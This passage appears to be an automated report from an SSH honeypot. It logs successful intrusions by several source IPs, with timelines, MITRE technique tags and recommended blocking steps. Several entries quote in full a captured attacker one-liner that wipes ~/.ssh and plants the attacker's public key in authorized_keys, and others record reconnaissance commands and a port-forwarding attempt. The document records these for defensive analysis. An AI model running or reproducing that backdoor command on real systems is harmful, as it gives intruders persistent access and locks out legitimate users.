| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:18:31` | `cowrie.session.connect` |
| `2026-09-27 13:18:31` | `cowrie.client.version` |
| `2026-09-27 13:18:31` | `cowrie.client.kex` |
| `2026-09-27 13:18:33` | `cowrie.login.success` |
| `2026-09-27 13:18:34` | `cowrie.session.params` |
| `2026-09-27 13:18:34` | `cowrie.command.input` |
| `2026-09-27 13:18:34` | `cowrie.command.failed` |
| `2026-09-27 13:18:34` | `cowrie.log.closed` |
| `2026-09-27 13:18:35` | `cowrie.session.params` |
| `2026-09-27 13:18:35` | `cowrie.command.input` |
| `2026-09-27 13:18:35` | `cowrie.session.file_download` |
| `2026-09-27 13:18:35` | `cowrie.log.closed` |
| `2026-09-27 13:18:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c46de641f4d8

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-09-27 13:18 |
| **Last Seen** | 2026-09-27 13:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:18:36` | `cowrie.session.connect` |
| `2026-09-27 13:18:36` | `cowrie.client.version` |
| `2026-09-27 13:18:36` | `cowrie.client.kex` |
| `2026-09-27 13:18:37` | `cowrie.login.success` |
| `2026-09-27 13:18:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40e4cbc42ef5

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:18 |
| **Last Seen** | 2026-09-27 13:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:18:36` | `cowrie.session.connect` |
| `2026-09-27 13:18:36` | `cowrie.client.version` |
| `2026-09-27 13:18:36` | `cowrie.client.kex` |
| `2026-09-27 13:18:36` | `cowrie.login.success` |
| `2026-09-27 13:18:37` | `cowrie.session.params` |
| `2026-09-27 13:18:37` | `cowrie.command.input` |
| `2026-09-27 13:18:37` | `cowrie.log.closed` |
| `2026-09-27 13:18:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-513bc12f4fe0

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-09-27 13:18 |
| **Last Seen** | 2026-09-27 13:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:18:38` | `cowrie.session.connect` |
| `2026-09-27 13:18:38` | `cowrie.client.version` |
| `2026-09-27 13:18:38` | `cowrie.client.kex` |
| `2026-09-27 13:18:39` | `cowrie.login.success` |
| `2026-09-27 13:18:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac1120595158

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:18 |
| **Last Seen** | 2026-09-27 13:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:18:40` | `cowrie.session.connect` |
| `2026-09-27 13:18:40` | `cowrie.client.version` |
| `2026-09-27 13:18:41` | `cowrie.client.kex` |
| `2026-09-27 13:18:41` | `cowrie.login.success` |
| `2026-09-27 13:18:42` | `cowrie.session.params` |
| `2026-09-27 13:18:42` | `cowrie.command.input` |
| `2026-09-27 13:18:42` | `cowrie.log.closed` |
| `2026-09-27 13:18:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90552b88aa23

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:18 |
| **Last Seen** | 2026-09-27 13:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:18:45` | `cowrie.session.connect` |
| `2026-09-27 13:18:46` | `cowrie.client.version` |
| `2026-09-27 13:18:46` | `cowrie.client.kex` |
| `2026-09-27 13:18:46` | `cowrie.login.success` |
| `2026-09-27 13:18:47` | `cowrie.session.params` |
| `2026-09-27 13:18:47` | `cowrie.command.input` |
| `2026-09-27 13:18:47` | `cowrie.log.closed` |
| `2026-09-27 13:18:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33e81d88f5ec

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:18 |
| **Last Seen** | 2026-09-27 13:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:18:51` | `cowrie.session.connect` |
| `2026-09-27 13:18:51` | `cowrie.client.version` |
| `2026-09-27 13:18:51` | `cowrie.client.kex` |
| `2026-09-27 13:18:51` | `cowrie.login.success` |
| `2026-09-27 13:18:52` | `cowrie.session.params` |
| `2026-09-27 13:18:52` | `cowrie.command.input` |
| `2026-09-27 13:18:52` | `cowrie.log.closed` |
| `2026-09-27 13:18:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efcc99f744e2

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:18 |
| **Last Seen** | 2026-09-27 13:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:18:55` | `cowrie.session.connect` |
| `2026-09-27 13:18:55` | `cowrie.client.version` |
| `2026-09-27 13:18:55` | `cowrie.client.kex` |
| `2026-09-27 13:18:56` | `cowrie.login.success` |
| `2026-09-27 13:18:57` | `cowrie.session.params` |
| `2026-09-27 13:18:57` | `cowrie.command.input` |
| `2026-09-27 13:18:57` | `cowrie.log.closed` |
| `2026-09-27 13:18:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a9dde821dfc

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:19 |
| **Last Seen** | 2026-09-27 13:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:19:00` | `cowrie.session.connect` |
| `2026-09-27 13:19:00` | `cowrie.client.version` |
| `2026-09-27 13:19:00` | `cowrie.client.kex` |
| `2026-09-27 13:19:01` | `cowrie.login.success` |
| `2026-09-27 13:19:02` | `cowrie.session.params` |
| `2026-09-27 13:19:02` | `cowrie.command.input` |
| `2026-09-27 13:19:02` | `cowrie.log.closed` |
| `2026-09-27 13:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f3a244b847d

| Field | Detail |
|---|---|
| **Source IP** | `152.52.15[.]213` |
| **First Seen** | 2026-09-27 13:19 |
| **Last Seen** | 2026-09-27 13:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:19:02` | `cowrie.session.connect` |
| `2026-09-27 13:19:02` | `cowrie.client.version` |
| `2026-09-27 13:19:02` | `cowrie.client.kex` |
| `2026-09-27 13:19:03` | `cowrie.login.success` |
| `2026-09-27 13:19:04` | `cowrie.session.params` |
| `2026-09-27 13:19:04` | `cowrie.command.input` |
| `2026-09-27 13:19:04` | `cowrie.command.failed` |
| `2026-09-27 13:19:04` | `cowrie.log.closed` |
| `2026-09-27 13:19:05` | `cowrie.session.params` |
| `2026-09-27 13:19:05` | `cowrie.command.input` |
| `2026-09-27 13:19:05` | `cowrie.session.file_download` |
| `2026-09-27 13:19:05` | `cowrie.log.closed` |
| `2026-09-27 13:19:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.52.15[.]213` to AbuseIPDB if not already reported
- [ ] Block `152.52.15[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5aab57722aed

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:19 |
| **Last Seen** | 2026-09-27 13:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:19:05` | `cowrie.session.connect` |
| `2026-09-27 13:19:05` | `cowrie.client.version` |
| `2026-09-27 13:19:05` | `cowrie.client.kex` |
| `2026-09-27 13:19:06` | `cowrie.login.success` |
| `2026-09-27 13:19:07` | `cowrie.session.params` |
| `2026-09-27 13:19:07` | `cowrie.command.input` |
| `2026-09-27 13:19:07` | `cowrie.log.closed` |
| `2026-09-27 13:19:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd0fa618ea93

| Field | Detail |
|---|---|
| **Source IP** | `152.52.15[.]213` |
| **First Seen** | 2026-09-27 13:19 |
| **Last Seen** | 2026-09-27 13:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:19:06` | `cowrie.session.connect` |
| `2026-09-27 13:19:06` | `cowrie.client.version` |
| `2026-09-27 13:19:06` | `cowrie.client.kex` |
| `2026-09-27 13:19:07` | `cowrie.login.success` |
| `2026-09-27 13:19:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.52.15[.]213` to AbuseIPDB if not already reported
- [ ] Block `152.52.15[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-098a7c458956

| Field | Detail |
|---|---|
| **Source IP** | `152.52.15[.]213` |
| **First Seen** | 2026-09-27 13:19 |
| **Last Seen** | 2026-09-27 13:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:19:07` | `cowrie.session.connect` |
| `2026-09-27 13:19:07` | `cowrie.client.version` |
| `2026-09-27 13:19:08` | `cowrie.client.kex` |
| `2026-09-27 13:19:09` | `cowrie.login.success` |
| `2026-09-27 13:19:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.52.15[.]213` to AbuseIPDB if not already reported
- [ ] Block `152.52.15[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e13de969861

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:19 |
| **Last Seen** | 2026-09-27 13:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:19:10` | `cowrie.session.connect` |
| `2026-09-27 13:19:10` | `cowrie.client.version` |
| `2026-09-27 13:19:10` | `cowrie.client.kex` |
| `2026-09-27 13:19:11` | `cowrie.login.success` |
| `2026-09-27 13:19:12` | `cowrie.session.params` |
| `2026-09-27 13:19:12` | `cowrie.command.input` |
| `2026-09-27 13:19:12` | `cowrie.log.closed` |
| `2026-09-27 13:19:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-831439435a57

| Field | Detail |
|---|---|
| **Source IP** | `106.38.205[.]224` |
| **First Seen** | 2026-09-27 13:19 |
| **Last Seen** | 2026-09-27 13:19 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:19:35` | `cowrie.session.connect` |
| `2026-09-27 13:19:35` | `cowrie.client.version` |
| `2026-09-27 13:19:35` | `cowrie.client.kex` |
| `2026-09-27 13:19:39` | `cowrie.login.success` |
| `2026-09-27 13:19:40` | `cowrie.session.params` |
| `2026-09-27 13:19:40` | `cowrie.command.input` |
| `2026-09-27 13:19:40` | `cowrie.command.failed` |
| `2026-09-27 13:19:40` | `cowrie.log.closed` |
| `2026-09-27 13:19:41` | `cowrie.session.params` |
| `2026-09-27 13:19:41` | `cowrie.command.input` |
| `2026-09-27 13:19:41` | `cowrie.session.file_download` |
| `2026-09-27 13:19:41` | `cowrie.log.closed` |
| `2026-09-27 13:19:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.38.205[.]224` to AbuseIPDB if not already reported
- [ ] Block `106.38.205[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-781abd2e9bb9

| Field | Detail |
|---|---|
| **Source IP** | `106.38.205[.]224` |
| **First Seen** | 2026-09-27 13:19 |
| **Last Seen** | 2026-09-27 13:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:19:42` | `cowrie.session.connect` |
| `2026-09-27 13:19:42` | `cowrie.client.version` |
| `2026-09-27 13:19:42` | `cowrie.client.kex` |
| `2026-09-27 13:19:43` | `cowrie.login.success` |
| `2026-09-27 13:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.38.205[.]224` to AbuseIPDB if not already reported
- [ ] Block `106.38.205[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51ab8af1612c

| Field | Detail |
|---|---|
| **Source IP** | `106.38.205[.]224` |
| **First Seen** | 2026-09-27 13:19 |
| **Last Seen** | 2026-09-27 13:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:19:43` | `cowrie.session.connect` |
| `2026-09-27 13:19:43` | `cowrie.client.version` |
| `2026-09-27 13:19:44` | `cowrie.client.kex` |
| `2026-09-27 13:19:45` | `cowrie.login.success` |
| `2026-09-27 13:19:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.38.205[.]224` to AbuseIPDB if not already reported
- [ ] Block `106.38.205[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-555c644a1e5c

| Field | Detail |
|---|---|
| **Source IP** | `23.227.147[.]163` |
| **First Seen** | 2026-09-27 13:22 |
| **Last Seen** | 2026-09-27 13:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:22:15` | `cowrie.session.connect` |
| `2026-09-27 13:22:15` | `cowrie.client.version` |
| `2026-09-27 13:22:15` | `cowrie.client.kex` |
| `2026-09-27 13:22:15` | `cowrie.login.success` |
| `2026-09-27 13:22:15` | `cowrie.session.params` |
| `2026-09-27 13:22:15` | `cowrie.command.input` |
| `2026-09-27 13:22:15` | `cowrie.command.failed` |
| `2026-09-27 13:22:15` | `cowrie.log.closed` |
| `2026-09-27 13:22:16` | `cowrie.session.params` |
| `2026-09-27 13:22:16` | `cowrie.command.input` |
| `2026-09-27 13:22:16` | `cowrie.session.file_download` |
| `2026-09-27 13:22:16` | `cowrie.log.closed` |
| `2026-09-27 13:22:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.227.147[.]163` to AbuseIPDB if not already reported
- [ ] Block `23.227.147[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4479d34ca68

| Field | Detail |
|---|---|
| **Source IP** | `23.227.147[.]163` |
| **First Seen** | 2026-09-27 13:22 |
| **Last Seen** | 2026-09-27 13:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:22:16` | `cowrie.session.connect` |
| `2026-09-27 13:22:16` | `cowrie.client.version` |
| `2026-09-27 13:22:16` | `cowrie.client.kex` |
| `2026-09-27 13:22:16` | `cowrie.login.success` |
| `2026-09-27 13:22:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.227.147[.]163` to AbuseIPDB if not already reported
- [ ] Block `23.227.147[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-541538f0b187

| Field | Detail |
|---|---|
| **Source IP** | `23.227.147[.]163` |
| **First Seen** | 2026-09-27 13:22 |
| **Last Seen** | 2026-09-27 13:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:22:16` | `cowrie.session.connect` |
| `2026-09-27 13:22:16` | `cowrie.client.version` |
| `2026-09-27 13:22:16` | `cowrie.client.kex` |
| `2026-09-27 13:22:16` | `cowrie.login.success` |
| `2026-09-27 13:22:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.227.147[.]163` to AbuseIPDB if not already reported
- [ ] Block `23.227.147[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83e5a0edd325

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-27 13:28 |
| **Last Seen** | 2026-09-27 13:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:28:50` | `cowrie.session.connect` |
| `2026-09-27 13:28:50` | `cowrie.client.version` |
| `2026-09-27 13:28:50` | `cowrie.client.kex` |
| `2026-09-27 13:28:50` | `cowrie.login.success` |
| `2026-09-27 13:28:52` | `cowrie.direct-tcpip.request` |
| `2026-09-27 13:28:52` | `cowrie.direct-tcpip.ja4` |
| `2026-09-27 13:28:52` | `cowrie.direct-tcpip.data` |
| `2026-09-27 13:28:53` | `cowrie.direct-tcpip.request` |
| `2026-09-27 13:28:55` | `cowrie.direct-tcpip.ja4` |
| `2026-09-27 13:28:55` | `cowrie.direct-tcpip.data` |
| `2026-09-27 13:28:56` | `cowrie.direct-tcpip.request` |
| `2026-09-27 13:28:57` | `cowrie.direct-tcpip.ja4` |
| `2026-09-27 13:28:57` | `cowrie.direct-tcpip.data` |
| `2026-09-27 13:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4f06d1b800c

| Field | Detail |
|---|---|
| **Source IP** | `85.211.244[.]194` |
| **First Seen** | 2026-09-27 13:55 |
| **Last Seen** | 2026-09-27 13:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:55:52` | `cowrie.session.connect` |
| `2026-09-27 13:55:52` | `cowrie.client.version` |
| `2026-09-27 13:55:52` | `cowrie.client.kex` |
| `2026-09-27 13:55:53` | `cowrie.login.success` |
| `2026-09-27 13:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.211.244[.]194` to AbuseIPDB if not already reported
- [ ] Block `85.211.244[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3273e7c42525

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-09-27 13:55 |
| **Last Seen** | 2026-09-27 13:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
